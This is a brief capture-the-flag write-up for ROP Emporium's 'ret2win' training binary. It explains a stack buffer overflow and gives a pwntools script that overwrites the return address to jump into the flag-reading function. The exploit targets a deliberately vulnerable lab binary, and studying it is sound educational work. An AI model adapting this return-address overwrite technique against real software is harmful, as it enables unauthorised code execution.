![](../ROPEmporium/img/ret2win-1781401327194.webp)
![](../ROPEmporium/img/ret2win-1781401317281.webp)

the binary contains a function to read the flag, and a function that let us overflow the buffer

the only tricky part of this problem is to not mess the rbp and rsp as the 'ret2win' function use ret for the cat command

![](../ROPEmporium/img/ret2win-1781401424516.webp)

to that end, we just need to skip the first two command of the function

```
#!/usr/bin/python3
from pwn import *

context.arch="amd64"
context.os="linux"
context.log_level="debug"

script='''
b *ret2win
c
'''

# p=gdb.debug("./ret2win", cwd=".", gdbscript=script)
p=process("./ret2win", cwd=".")

payload=b"A"*40+b"\x5a\x07"
p.recvuntil(">")
p.send(payload)

p.interactive()
```